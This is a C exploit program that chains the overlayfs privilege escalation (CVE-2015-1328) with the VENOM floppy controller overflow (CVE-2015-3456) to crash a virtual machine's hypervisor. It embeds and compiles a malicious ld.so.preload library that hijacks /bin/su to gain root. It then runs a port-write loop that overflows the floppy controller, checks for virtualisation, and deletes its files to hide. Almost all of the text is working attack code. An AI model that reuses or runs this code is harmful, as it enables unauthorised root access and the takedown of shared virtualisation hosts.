/*
This program combines the CVE 2015-1328 and CVE 2015-3456 vulnerabilities to forcefully obtain root access 
and then proceed with the floppy controller buffer overflow to kill the hypervisor.

As a result, in order to work this does not need to be run as root / admin.

Used POC code from https:/www.exploit-db.com/operations/37292 and https:/www.exploit-db.com/exploits/37053.
*/

%:include <stdio.h>
%:include <stdlib.h>
%:include <unistd.h>
%:include <sched.h>
%:include <sys/stat.h>
%:include <sys/types.h>
%:include <sys/mount.h>
%:include <stdio.h>
%:include <stdlib.h>
%:include <unistd.h>
%:include <sched.h>
%:include <sys/stat.h>
%:include <sys/types.h>
%:include <sys/mount.h>
%:include <sys/types.h>
%:include <signal.h>
%:include <fcntl.h>
%:include <string.h>
%:include <linux/sched.h>

%:define ROOTACCESSLIB "\
%:include <unistd.h>\n\
\
uid_t(*_real_getuid) (void);\n\
char path[128];\n\
uid_t getuid(void){\n\
    _real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\n\
    readlink(\"/proc/self/exe\", (char *) &path, 128);\n\
\
    if(geteuid() == 0 && !strcmp(path, \"/bin/su\")) {\n\
        unlink(\"/etc/ld.so.preload\");\n\
        unlink(\"/tmp/overlayFsExploitLib.so\");\n\
        setresuid(0, 0, 0);\n\
        setresgid(0, 0, 0);\n\
        \
        /*Call hype killing executable, now as root*/\
        \
        execle(\"/bin/sh\", \"sh\", \"-c\", \"/tmp/killHype\",NULL, NULL);\n\
    }\n\
    return _real_getuid();\n\
}"

%:define KILLHYPECODE "\
%:include <sys/io.h>\n\
void main(){\n\
    int i;\n\
    iopl(3); //Set IO privilege level in order to be able to output data to floppy disk controller\n\
    outb(0x0a,0x3f5); //Send read ID command\n\
    for(i=0;i<10000000;i++)\n\
        outb(0x60,0x3f5); //Overflow buffer since after the previous call, the controller code will not perform bounds checking\n\
}"

static char childStack[1024*1024];

//This process prepares the overlayfs environment for the exploit which will allow us to run executables as root even if we're not.
static int childProcess(void *arg)
{
    char *childProcessFIle;
    system("rm -rf /tmp/overlayFsFolder");
    mkdir("/tmp/overlayFsFolder", 0777);
    mkdir("/tmp/overlayFsFolder/work", 0777);
    mkdir("/tmp/overlayFsFolder/upper",0777);
    mkdir("/tmp/overlayFsFolder/o",0777);

    if (mount("overlay", "/tmp/overlayFsFolder/o", "overlayfs", MS_MGC_VAL, "lowerdir=/proc/sys/kernel,upperdir=/tmp/overlayFsFolder/upper") != 0) {
        if (mount("overlay", "/tmp/overlayFsFolder/o", "overlay", MS_MGC_VAL, "lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/overlayFsFolder/upper,workdir=/tmp/overlayFsFolder/work") != 0) {
            exit(-1);
        }
        childProcessFIle = ".access";
        chmod("/tmp/overlayFsFolder/work/work",0777);
    } else childProcessFIle = "ns_last_pid";

    chdir("/tmp/overlayFsFolder/o");
    rename(childProcessFIle,"ld.so.preload");

    chdir("/");
    umount("/tmp/overlayFsFolder/o");
    if (mount("overlay", "/tmp/overlayFsFolder/o", "overlayfs", MS_MGC_VAL, "lowerdir=/tmp/overlayFsFolder/upper,upperdir=/etc") != 0) {
        if (mount("overlay", "/tmp/overlayFsFolder/o", "overlay", MS_MGC_VAL, "lowerdir=/tmp/overlayFsFolder/upper,upperdir=/etc,workdir=/tmp/overlayFsFolder/work") != 0) {
            exit(-1);
        }
        chmod("/tmp/overlayFsFolder/work/work",0777);
    }

    chmod("/tmp/overlayFsFolder/o/ld.so.preload",0777);
    umount("/tmp/overlayFsFolder/o");
}

void main(int argc, char **argv)
{
    //Determine if we are in a virtual environment, else quit silently
    int lspciCheckStatus = system("lspci | grep -i 'innotek\|virtualbox\|qemu\|kvm' > /dev/null");
    int dmesgCheckStatus = system("dmesg | grep -i 'innotek\|virtualbox\|qemu\|kvm' > /dev/null");
    if(WEXITSTATUS(lspciCheckStatus) || WEXITSTATUS(dmesgCheckStatus)){
        //If this machine does not have the gcc compiler, return since it is a pre-requisite for this implementation.
        int gccCheckStatus = system("which gcc | grep -i 'gcc' > /dev/null");
        if(WEXITSTATUS(gccCheckStatus)){
            return;
        }
        //Prepare to run child thread that will prepare the overlayfs environment for the exploit to gain root access.
        int childProcessStatus, fileDescriptor, rootAccessLib, killHype;
        pid_t childProcessWrapper, initializingChildProcess;

        if((childProcessWrapper = fork()) == 0) {

            unshare(CLONE_NEWUSER);
            if((initializingChildProcess = fork()) == 0) {
                pid_t childProcessPid = clone(childProcess, childStack + (1024*1024), CLONE_NEWNS | SIGCHLD, NULL);
                if(childProcessPid < 0) {
                    return;
                }

                waitpid(childProcessPid, &childProcessStatus, 0);
            }
            waitpid(initializingChildProcess, &childProcessStatus, 0);
            return;
        }

        usleep(300000);

        wait(NULL);

        fileDescriptor = open("/etc/ld.so.preload",O_WRONLY);

        if(fileDescriptor == -1) {
            return;
        }

        //Create and compile malicious library that will give us root access
        rootAccessLib = open("/tmp/overlayFsExploitLib.c",O_CREAT|O_WRONLY,0777);
        write(rootAccessLib,ROOTACCESSLIB,strlen(ROOTACCESSLIB));
        close(rootAccessLib);
        rootAccessLib = system("gcc -fPIC -shared -o /tmp/overlayFsExploitLib.so /tmp/overlayFsExploitLib.c -ldl -w");

        //Create and compile malicious executable that will perform the buffer overflow of the floppy controller
        killHype = open("/tmp/killHype.c",O_CREAT|O_WRONLY,0777);
        write(killHype,KILLHYPECODE,strlen(KILLHYPECODE));
        close(killHype);
        killHype = system("gcc -o /tmp/killHype /tmp/killHype.c");

        //If we failed to create either the root access library or the buffer overflow executable, return silently
        if(rootAccessLib != 0 && killHype != 0) {
            return;
        }
        write(fileDescriptor,"/tmp/overlayFsExploitLib.so\n",28);
        close(fileDescriptor);
        //Cleanup in order to hide
        system("rm -rf /tmp/overlayFsFolder /tmp/overlayFsExploitLib.c");

        //This line will trigger running the killHype executable as root, which will instantly crash the VM and the hypervisor thread.
        execl("/bin/su","su", NULL);
    }
}
